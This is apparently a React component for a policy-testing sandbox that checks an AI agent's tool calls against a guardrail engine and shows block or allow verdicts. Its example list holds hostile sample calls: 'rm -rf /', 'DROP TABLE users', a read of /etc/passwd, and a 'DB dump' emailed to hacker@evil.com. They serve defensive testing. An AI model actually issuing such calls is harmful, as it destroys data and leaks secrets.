"use client";
import { useState } from "react";
import { Loader2, ShieldX, ShieldCheck, Eye, Zap } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { cn } from "@/lib/utils";
import { api, type PolicyDecision } from "@/lib/api";

interface HistoryItem { req: { tool_name: string; user_intent: string }; result: PolicyDecision }

const ACTION_STYLES: Record<string, { icon: React.ElementType; classes: string; label: string }> = {
  BLOCK:  { icon: ShieldX,    classes: "border-red-500/40 bg-red-500/10 text-red-400",     label: "BLOCKED" },
  ALLOW:  { icon: ShieldCheck, classes: "border-emerald-500/40 bg-emerald-500/10 text-emerald-400", label: "ALLOWED" },
  REDACT: { icon: Eye,        classes: "border-amber-500/40 bg-amber-500/10 text-amber-400", label: "REDACT" },
};

const EXAMPLES = [
  {
    label: "Safe read",
    tool_name: "read_file",
    tool_args: `{"path": "./src/main.py"}`,
    user_intent: "code summary",
  },
  {
    label: "rm -rf /",
    tool_name: "run_shell",
    tool_args: `{"cmd": "rm -rf /"}`,
    user_intent: "clean up temp files",
  },
  {
    label: "DROP TABLE",
    tool_name: "query_db",
    tool_args: `{"query": "DROP TABLE users"}`,
    user_intent: "run a query",
  },
  {
    label: "/etc/passwd",
    tool_name: "read_file",
    tool_args: `{"path": "/etc/passwd"}`,
    user_intent: "give me a code summary",
  },
  {
    label: "Intent drift",
    tool_name: "send_email",
    tool_args: `{"to": "hacker@evil.com", "subject": "DB dump"}`,
    user_intent: "database query results",
  },
];

export function PolicyTester() {
  const [toolName, setToolName]   = useState("read_file");
  const [toolArgs, setToolArgs]   = useState(`{"path": "./src/main.py"}`);
  const [intent, setIntent]       = useState("code summary");
  const [loading, setLoading]     = useState(false);
  const [result, setResult]       = useState<PolicyDecision | null>(null);
  const [error, setError]         = useState<string | null>(null);
  const [history, setHistory]     = useState<HistoryItem[]>([]);

  async function evaluate() {
    setError(null);
    let parsed: Record<string, unknown>;
    try { parsed = JSON.parse(toolArgs); }
    catch { setError("tool_args is not valid JSON."); return; }

    setLoading(true);
    try {
      const dec = await api.evaluatePolicy({ tool_name: toolName, tool_args: parsed, user_intent: intent });
      setResult(dec);
      setHistory((h) => [{ req: { tool_name: toolName, user_intent: intent }, result: dec }, ...h].slice(0, 10));
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  }

  function loadExample(ex: typeof EXAMPLES[0]) {
    setToolName(ex.tool_name);
    setToolArgs(ex.tool_args);
    setIntent(ex.user_intent);
    setResult(null);
    setError(null);
  }

  const style = result ? (ACTION_STYLES[result.action] ?? ACTION_STYLES.ALLOW) : null;

  return (
    <div className="grid gap-6 lg:grid-cols-2">
      {/* Input panel */}
      <Card className="border-zinc-800 bg-zinc-900">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-zinc-300">Policy Evaluation Sandbox</CardTitle>
          <p className="text-xs text-zinc-600">Test any tool call against the live PolicyEngine — no execution, no side effects.</p>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Quick examples */}
          <div>
            <p className="mb-2 text-xs text-zinc-500">Quick examples</p>
            <div className="flex flex-wrap gap-1.5">
              {EXAMPLES.map((ex) => (
                <button
                  key={ex.label}
                  onClick={() => loadExample(ex)}
                  className="rounded-md border border-zinc-700 px-2.5 py-1 text-xs text-zinc-400 hover:border-zinc-500 hover:text-zinc-200 transition-colors"
                >
                  {ex.label}
                </button>
              ))}
            </div>
          </div>

          <div className="space-y-1">
            <label className="text-xs text-zinc-500">Tool Name</label>
            <Input
              value={toolName}
              onChange={(e) => setToolName(e.target.value)}
              placeholder="e.g. read_file"
              className="border-zinc-700 bg-zinc-950 text-zinc-200 placeholder:text-zinc-600"
            />
          </div>

          <div className="space-y-1">
            <label className="text-xs text-zinc-500">Tool Args (JSON)</label>
            <Textarea
              value={toolArgs}
              onChange={(e) => setToolArgs(e.target.value)}
              rows={4}
              spellCheck={false}
              className="border-zinc-700 bg-zinc-950 font-mono text-xs text-zinc-200 placeholder:text-zinc-600"
              placeholder='{"path": "./src/main.py"}'
            />
          </div>

          <div className="space-y-1">
            <label className="text-xs text-zinc-500">User Intent (original prompt)</label>
            <Input
              value={intent}
              onChange={(e) => setIntent(e.target.value)}
              placeholder="e.g. give me a code summary"
              className="border-zinc-700 bg-zinc-950 text-zinc-200 placeholder:text-zinc-600"
            />
          </div>

          {error && (
            <p className="rounded-md border border-red-500/30 bg-red-500/10 px-3 py-2 text-xs text-red-400">
              {error}
            </p>
          )}

          <Button
            onClick={evaluate}
            disabled={loading || !toolName || !intent}
            className="w-full bg-zinc-700 hover:bg-zinc-600 text-zinc-100"
          >
            {loading ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Zap className="h-3.5 w-3.5" />}
            {loading ? "Evaluating…" : "Evaluate Policy"}
          </Button>
        </CardContent>
      </Card>

      {/* Result panel */}
      <div className="space-y-4">
        {result && style ? (
          <Card className={cn("border", style.classes.split(" ").find(c => c.startsWith("border")), "bg-zinc-900")}>
            <CardContent className="p-5 space-y-4">
              {/* Verdict header */}
              <div className={cn("flex items-center gap-3 rounded-lg border p-4", style.classes)}>
                <style.icon className="h-8 w-8 shrink-0" />
                <div>
                  <p className="text-xl font-bold">{style.label}</p>
                  <p className="text-xs opacity-70">PolicyEngine verdict</p>
                </div>
                <div className="ml-auto text-right">
                  <p className="text-2xl font-bold tabular-nums">{result.risk_score.toFixed(3)}</p>
                  <p className="text-xs opacity-70">risk score</p>
                </div>
              </div>

              {/* Risk bar */}
              <div>
                <div className="mb-1 flex justify-between text-xs text-zinc-500">
                  <span>Risk Level</span>
                  <span className="tabular-nums">{(result.risk_score * 100).toFixed(1)}%</span>
                </div>
                <div className="h-2 w-full rounded-full bg-zinc-800">
                  <div
                    className={cn("h-2 rounded-full transition-all", {
                      "bg-red-500":     result.risk_score >= 0.9,
                      "bg-orange-500":  result.risk_score >= 0.7 && result.risk_score < 0.9,
                      "bg-amber-500":   result.risk_score >= 0.4 && result.risk_score < 0.7,
                      "bg-emerald-500": result.risk_score < 0.4,
                    })}
                    style={{ width: `${result.risk_score * 100}%` }}
                  />
                </div>
              </div>

              {/* Triggered rules */}
              {result.triggered_rules.length > 0 && (
                <div>
                  <p className="mb-2 text-xs text-zinc-500">Triggered Rules</p>
                  <div className="flex flex-wrap gap-1.5">
                    {result.triggered_rules.map((r) => (
                      <span key={r} className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-0.5 font-mono text-xs text-red-400">
                        {r}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {/* Reason */}
              <div>
                <p className="mb-1 text-xs text-zinc-500">Reason</p>
                <pre className="whitespace-pre-wrap rounded-md border border-zinc-800 bg-zinc-950 p-3 font-mono text-xs text-zinc-300 leading-relaxed">
                  {result.reason}
                </pre>
              </div>
            </CardContent>
          </Card>
        ) : (
          <Card className="border-zinc-800 bg-zinc-900">
            <CardContent className="flex h-48 flex-col items-center justify-center gap-3 text-center">
              <Zap className="h-8 w-8 text-zinc-700" />
              <p className="text-sm text-zinc-600">Fill in the form and click Evaluate</p>
              <p className="text-xs text-zinc-700">Results appear here instantly</p>
            </CardContent>
          </Card>
        )}

        {/* History */}
        {history.length > 0 && (
          <Card className="border-zinc-800 bg-zinc-900">
            <CardHeader className="pb-2">
              <CardTitle className="text-xs text-zinc-500">Recent evaluations (this session)</CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              {history.map((h, i) => {
                const s = ACTION_STYLES[h.result.action];
                return (
                  <div key={i} className="flex items-center gap-3 border-b border-zinc-800/50 px-4 py-2 last:border-0">
                    <s.icon className={cn("h-3.5 w-3.5 shrink-0", s.classes.split(" ").find(c => c.startsWith("text")))} />
                    <span className="font-mono text-xs text-zinc-400 truncate flex-1">{h.req.tool_name}</span>
                    <span className="text-xs text-zinc-600 truncate max-w-[120px]">{h.req.user_intent}</span>
                    <span className={cn("text-xs font-mono tabular-nums font-semibold", s.classes.split(" ").find(c => c.startsWith("text")))}>
                      {h.result.risk_score.toFixed(3)}
                    </span>
                  </div>
                );
              })}
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}
